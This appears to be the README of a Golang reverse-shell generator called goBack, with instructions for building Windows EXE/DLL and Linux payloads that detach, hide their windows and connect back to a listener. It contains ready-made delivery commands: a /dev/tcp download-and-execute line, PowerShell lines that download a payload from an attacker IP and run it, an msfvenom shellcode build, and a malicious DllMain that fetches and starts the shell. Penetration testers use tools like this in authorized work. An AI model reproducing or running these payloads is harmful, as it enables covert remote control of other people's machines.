######
goBack
######

| Golang Reverse Shell

|

***************
Getting started
***************

| goBack use Docker to build and move payloads to /var/www/html/

.. code-block:: bash

    sudo pipx install git+https://gitlab.com/charles.gargasson/goback.git@main --global
    # sudo pipx upgrade goback --global
    # sudo pipx uninstall goback --global

|

.. code-block:: bash

    sudo goback -i 1.2.3.4 -p 1337
    sudo goback -p 1337 --protocol udp
    sudo goback -i tun0 -p 53

|
| By default goback generate payloads for tun0 interface on port 53.
| If tun0 is missing it will take the default gateway interface ip

.. code-block:: bash

    sudo goback

|

*************
Build options
*************

Old systems
***********

| New golang versions doesn't support old systems such as 2008/Windows7.
| You can set goBack to use golang 1.20 using the old option.
| Notice that builds with old versions support are more likely to get strike by AV, and PS have issues.

.. code-block:: bash

    sudo goback --old

|

*****************
Payloads behavior
*****************

Windows EXE
***********

| r.exe and r32.exe payloads will start a child process with CREATE_NEW_PROCESS_GROUP and DETACHED_PROCESS flags,
| then powershell.exe is started with CREATE_NO_WINDOW flag.

|

Windows DLL
***********

| r.dll and r32.dll payloads embed r32.exe. When the DLL init, it create and run r32.exe in current user's temp folder.
| If it fails, then the payload directly start cmd.exe with CREATE_NO_WINDOW flag, and will not survive the death of the parent process

|

Linux
*****

| The linux payload "r" restart detached with pgid.
| Then shell start in the following fallback order

- /bin/bash with /usr/bin/python pty
- /bin/bash
- /bin/sh

|

********
Features
********

| Reverseshell will connect back to you with a web request, press enter to start the shell.
| If you don't, the payload will try again 5 seconds later (you just have to start a new listener).

| Embedded commands

- goreset  : Kill session and start a new one (in the same connection)
- gocmd    : Same but with cmd//sh as shell  (usefull when encountering powershell/bash issues)
- gokillme : Gracefully kill session and leave (if connection ends, the process will terminate anyway)

|

****************
Payload delivery
****************

| goBack generate powershell and linux shell commands to download and execute reverseshell.
| Here is some extra commands ....

.. code-block:: bash

    # Linux - without curl/wget
    nc -lvnp 7777 < /var/www/html/r # ATTACKER SIDE, Wait for victim, then cancel to close connection
    F="/dev/shm/r";cat</dev/tcp/127.0.0.1/7777>$F;chmod 755 $F;$F # Target side

.. code-block:: bash

    # msfvenom windows x86 shellcode to call payload with powershell
    CMD='powershell "wget 4.3.2.1/r32.exe -o $env:TEMP\r.exe;saps $env:TEMP\r.exe"'
    msfvenom -a x86 --platform Windows -p windows/exec CMD="$CMD" -f python -b "\x00\x20" --smallest -v shellcode EXITFUNC=thread

.. code-block:: powershell

    powershell "wget 4.3.2.1/r.exe -o $env:TEMP\r.exe;saps -NoNewWindow $env:TEMP\r.exe"

|

*******
Handler
*******

| goBack support standard reverseshell handler such as netcat, with cleartext content.
|
| I made a reverseshell manager for additional features https://gitlab.com/charles.gargasson/rsm

- UDP support (and UDP payload download)
- (todo) Data encoding to hide content 
- (todo) File uploads/downloads 

|

************
Troubleshoot
************

Architecture
************

| When using x32 payload on x64 machines, powershell has limitations.
| Run the following command to get a x64 powershell.

.. code-block:: bash

    C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe

|

DLL
***

| If for some reason the golang init entrypoint of the DLL payload doesn't work as expected,
| or if you want the dll to detach from the initial process,
| you can try this DLL code to call the reverseshell 
| https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain

.. code-block:: bash

    cat <<'EOF'>exploit.c
    #include <windows.h>
    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
        switch(dwReason){
            case DLL_PROCESS_ATTACH:
                system("powershell -c \"wget 192.168.45.235/r32.exe -o $env:TEMP\\r.exe;saps -NoNewWindow $env:TEMP\\r.exe\"");
                break;
            case DLL_PROCESS_DETACH:
                break;
            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
        }
        return TRUE;
    }
    EOF

    x86_64-w64-mingw32-gcc exploit.c -shared -o exploit64.dll
    i686-w64-mingw32-gcc exploit.c -shared -o exploit32.dll

|
